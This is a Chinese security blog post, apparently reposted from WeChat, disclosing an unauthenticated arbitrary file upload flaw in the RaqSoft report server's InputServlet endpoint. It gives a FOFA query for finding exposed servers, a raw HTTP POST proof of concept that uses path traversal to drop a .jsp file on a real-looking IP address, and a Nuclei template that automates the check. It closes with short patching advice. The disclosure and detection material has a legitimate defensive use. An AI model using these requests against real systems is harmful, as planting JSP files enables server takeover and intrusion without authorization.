<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/N924z90HkjwcaseTqlifQQ)

**免责声明**  

<table width="677"><tbody><tr><td valign="top" rowspan="5" colspan="1"><strong><strong>本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关，本次测试仅供学习使用。如有内容争议或侵权，请及时私信我们！我们会立即删除并致歉。谢谢！</strong></strong></td></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table>

**一、漏洞描述**

润乾报表是一款专为企业级应用设计的纯 JAVA 报表工具，以其先进的企业级报表分析能力而闻名。其 InputServlet 接口存在任意文件上传漏洞，未经身份验证的恶意攻击者可以上传任意文件，进而控制服务器系统。

![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF0OAAjoek2ydqx5tNRoLTRGasokVNsiaicjpexfibxsZjqIUIib062gzFHgficXqK3GFO8Hia39BYd7b6icQ/640?wx_fmt=png&from=appmsg)

**二、网络测绘**
----------

```
fofa："润乾报表"

```

![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF0OAAjoek2ydqx5tNRoLTRGPBseEJpicAqB1ZqlkU1PwfoSYV1sQ1LKa9v3CsUxE2mtJ3UIwxFxnrg/640?wx_fmt=png&from=appmsg)

**三、漏洞复现**
----------

测试上传 test.jsp 文件

![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF0OAAjoek2ydqx5tNRoLTRGY5ViaFDA4ttPYgckgUekVUl0HvzrRM7S3P5VsoXnJDFOM15z83hEbVw/640?wx_fmt=png&from=appmsg)

**四、漏洞检测 poc**

```
POST /InputServlet?action=12 HTTP/1.1
Host: 120.55.41.98:6868
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=00contentOboundary00
Connection: close
Content-Length: 238
--00contentOboundary00
Content-Disposition: form-data; 
1024
--00contentOboundary00
Content-Disposition: form-data; /\..\\..\\..\12.jsp"
Content-Type: image/jpeg
test
--00contentOboundary00--

```

**五、Nuclei 检测 POC**

```
id: raqsoft_InputServlet_FileUpload
info:
  name: raqsoft_InputServlet_FileUpload
  author: hamal
  severity: high
  description: 润乾报表InputServlet存在任意文件上传漏洞
  reference:
    - https://
  tags: 微信公众号（实战安全研究）
http:
  - raw:
      - |-
        POST /InputServlet?action=12 HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Content-Type: multipart/form-data; boundary=00contentOboundary00
        Connection: close
        Content-Length: 240
        --00contentOboundary00
        Content-Disposition: form-data; 
        1024
        --00contentOboundary00
        Content-Disposition: form-data; /\..\\..\\..\12.jsp"
        Content-Type: image/jpeg
        test
        --00contentOboundary00--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 12.jsp
      - type: status
        status:
          - 200

```

![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF0OAAjoek2ydqx5tNRoLTRGJIyCWZCdeA3ChIliaLCyNtFhPxRZ6sxLibbun4Vibjg0CTaOSKueuibO5g/640?wx_fmt=png&from=appmsg)

关注公众号：**实战安全研究**

公众号回复 "**Nuclei**" 获取往期 Nuclei 漏洞 POC

**六、漏洞修复**

1、建议联系厂商打补丁或升级版本。

2、增加 Web 应用防火墙防护。

3、关闭互联网暴露面或接口设置访问权限。